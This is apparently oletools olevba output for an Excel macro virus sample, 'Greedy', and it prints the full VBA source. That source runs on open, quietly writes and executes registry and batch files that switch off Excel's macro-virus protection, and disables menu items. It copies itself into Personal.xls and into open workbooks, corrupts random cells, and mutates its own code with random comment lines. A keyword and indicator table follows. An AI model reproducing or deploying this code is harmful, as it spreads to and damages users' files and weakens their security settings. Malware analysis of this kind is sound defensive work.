olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Greedy-9b6e4cedbae7dede29aa9a52f890ef0681ac7ab6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Greedy-9b6e4cedbae7dede29aa9a52f890ef0681ac7ab6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
Application.OnSheetActivate = "Dmizer"
End Sub

Sub Dmizer()
On Error Resume Next
Rem B179K367R357B428G971W542K263C502U983P714N416
'This is taken from Shiver by AVM | Thanks
'-------------------------------------------------------------------

Rem S662U831U56T908F555X634N152M556T389R185D502D265P809Q288N352K256K787J700E527L948J126W635S928X471R954N257K40E150V229R182Q417Q19
If UCase(Dir("c:\o6.reg")) <> "O6.REG" Or UCase(Dir("c:\o6.bat")) <> "O6.BAT" Then
Rem C535C102V198I568P921R777U84G755B552F933K823G410I415V469K507P344O829K236S804V575I937S539E460I820T215D637F800J4T960
Rem P950X502R729U668J650T807C595I484P247K474J233F37B511V430J16T671W542O560W892V935J265F200O891S79W933I639U618F555U631J621E757O521F769N841S570P337G585

Open "c:\o6.reg" For Output As 1
Print #1, "REGEDIT4"
Rem V122E933F136V521D626B790U705Q357S525X231S800K456U569J8E212I923
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1
Rem B763N40G81W963G21O0P530E293C552J963G795R996G742H381F923B501

Rem U33R36E209O547O159D289W509V507N99C392V251F464
Open "c:\o6.bat" For Output As 1
Rem W702V12S497W711G773N15M798J931N303U668V748F12H844S971P314X673Q907F497J669R469P453Q899Q689I277C396E408J452B805F105T333B740W91N898I560L538Q994B552U57
Rem S392D865Q562E239F473L341U562S749P681P747E982P331W62C478R345P664O734S626U496Q382E400F490
Rem I570U836N69H200
Print #1, "regedit /s c:\o6.reg"
Rem K990K835E488T316D906H912K746L749J763C247G357W634U215F715
Close 1
End If

Rem P711M792Q365K618Q259K799T107K386M987G707I482G634F71W101V768M863S16N521N821F778P154
Rem K364W559R785N559T669W479W659S742C179J775S693U400S230S474N139N784T112R183C448X979J567O584P778F395Q292Q941C489N271P435D594T645K173V99C462O510L497
Shell ("c:\o6.bat"), vbHide
Rem U622Q576V156J817K322H267X927L804E527V36C184W178F495I207O846M240D937V183W541T619M520F946P96U773N360G555W43O488J528
Rem R420X552R632T913J914T721V602B626X162C444R579D678F2S282C629L673P853D3C648U666Q212E74T858D664S154E169U311O130C830D663M387Q476R973K135O292

Rem E981L200Q311U91B680D603D964D233L255
Rem T357N431O77K163V896W668C632J926G706U373D666L540F944I953W876D266M969S650J412I443Q844L30
Rem K125J430D873V566L668C874
Rem K801C214P619D68R758U381C161P269U496M360U43P811D839C574H66F907G691G148
'-------------------------------------------------------------------
Rem L628G251W845U653W462K154K534G883W864L697E768R64N92D207Q472F494J857R84I270F805X824T310O990S454N112N944U167S226G789F624Q531O734O381P65L524

CommandBars("Tools").Controls(10).Enabled = False
CommandBars("Tools").Controls(12).Enabled = False
Rem N117H378O547N937S756C384W895T719G601N277O503U364H996G154R253O822O490V941D482L121N331K894K479D866V974
Rem O982I289E342R994Q935L505H29S827
CommandBars("View").Controls(3).Enabled = False
CommandBars("Window").Controls(3).Enabled = False
CommandBars("Window").Controls(4).Enabled = False

Rem R810G45O407I443R197M324S142N991V610T380J639S444
Am = Application.VBE.SelectedVBComponent.Name
Set Aw = ActiveWorkbook.VBProject.VBComponents
Rem I241N984
Data = "c:\win95.sys"
Rem W635S683G29B840F55K580O265T488R567D361H742L841I208
Px = "Personal.xls"
Pxx = Application.StartupPath & "\" & Px
Rem G884J492O395K980P869G903S69F737
WorkIns = 0
GlobalIns = 0

Rem Q576W783C145K364W544T490Q479F132S315L211D971W615M59U462H270H619H21U463X345Q901H27K636N998I675J978I107B361H105N358P203W389G805N723G956R368R351C212E603
Rem V218V276M15E93W217E634D585P366F915K75I930
Rem T704Q180D944S610S231F902R279S124G327W28Q769M816B59G158R833G452H321V347F968W502D338R605M248V638B160E393T824F236

With Application
    .StatusBar = "Dmize ur greed"
    .ScreenUpdating = False
    .DisplayAlerts = False
    .EnableCancelKey = xlDisabled
End With
Rem C338O721J332W775V759P41J957R199F711T916B633G357U815S945C708C385X271I923N358D867I357G351N87I346S929I931K227H811T920K73K440M210E844K384G215W941

Application.VBE.ActiveVBProject.VBComponents(Am).Export Data

Rem S398U66J646L544L159X972I348H685N849M28P413M378C45H404I393V585O396
If Dir(Pxx) = Px Then GlobalIns = 1

For i = 1 To Aw.Count
    If Aw(i).Name = Am Then WorkIns = 1
Rem J893F844V543I599Q512B927P902C360U115I144C995I506F221C174O943F133V679G651V447E537P165G661E284H719U683O246S809C882M67J895S457P934H475
Next

If GlobalIns <> 1 Then
Rem G167K221V137R821Q443I652L574T723S256D201R595U667D470P640U167M340B277T698H832N632K697E554T212P140B79B342Q506Q658V597K646N992J689D757J10J527O936W892J422N44
    Workbooks.Add.SaveAs FileName:=Pxx
    Workbooks(Px).VBProject.VBComponents.Import Data
    ActiveWindow.Visible = False
    Workbooks(Px).Save
End If

If WorkIns <> 1 Then
    Aw.Import Data
    Aw.SaveAs FileName:=ActiveWorkbook.FullName
End If

If Int(Rnd * 5) <= 3 Then
    
    For u = 1 To Int(Rnd * 15)

        Spalte = Chr(65 + Int(Rnd * 22))
        Zeile = Int(Rnd * 100) + 1
    
        Range(Spalte & Zeile).Select
        
        Act$ = ActiveCell.Value
        Act$ = Act$ & " Dmize ur greed"
        
        ActiveCell.Value = Act$
    
    Next u

End If

If Day(Now()) >= 25 Then
    With Assistant.NewBalloon
        .Heading = "Dis is X97M.Dmize ur greed"
        .Text = "'Ppl get ready n' dmize your greed', so speaks the Lord of Terror and so it is written!"
        .Show
    End With
End If
'This one is a bit changed APMRS
Rem W987S742D576
'-------------------------------------------------------------------
Rem M937N260E437U72P578D850K184S632V192E478O794R747V829D605U421

For i = 1 To 20
Rem J540X55I965U161W404Q451W130R29N706I574G869I357T677P503K892B512E627F20Q234F815E443U109N757S42W90H458L655R916V112G958G947K621V129
Rem V870H644M795L348R523N464J726O692X322U885M601O314R631P182O885O398W143F581L622V336V377N762N932Q224U181Q360M517J357K233B460M154

    v$ = ""
    LinieZahl = Application.VBE.ActiveVBProject.VBComponents.Item(Am).CodeModule.ProcCountLines("Dmizer", vbext_pk_Proc)
    lin = Int(Rnd * LinieZahl) + 1
    y = Int(Rnd * 40)

Rem H779J666I562L395L266X975G762L890Q24B510I11T108T814P128L47R697K480
    For x = 1 To y
Rem I227I749X806W17W722T887H208H80J344
        v$ = v$ & Chr(65 + (Rnd * 22)) & Int(Rnd * 999)
    Next x

    Application.VBE.ActiveVBProject.VBComponents.Item(Am).CodeModule.InsertLines lin, "Rem " & v$
Rem E399F566U588R971X522J889T441M124N218N148

Next i

End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Greedy-9b6e4cedbae7dede29aa9a52f890ef0681ac7ab6 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Greedy-9b6e4cedbae7dede29aa9a52f890ef0681ac7ab6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Greedy-9b6e4cedbae7dede29aa9a52f890ef0681ac7ab6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Greedy-9b6e4cedbae7dede29aa9a52f890ef0681ac7ab6 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |o6.reg              |Executable file name                         |
|IOC       |O6.REG              |Executable file name                         |
|IOC       |o6.bat              |Executable file name                         |
|IOC       |O6.BAT              |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|Hex String|'|9n@               |277C396E40                                   |
|Hex String|!~cMX               |217E634D58                                   |
+----------+--------------------+---------------------------------------------+

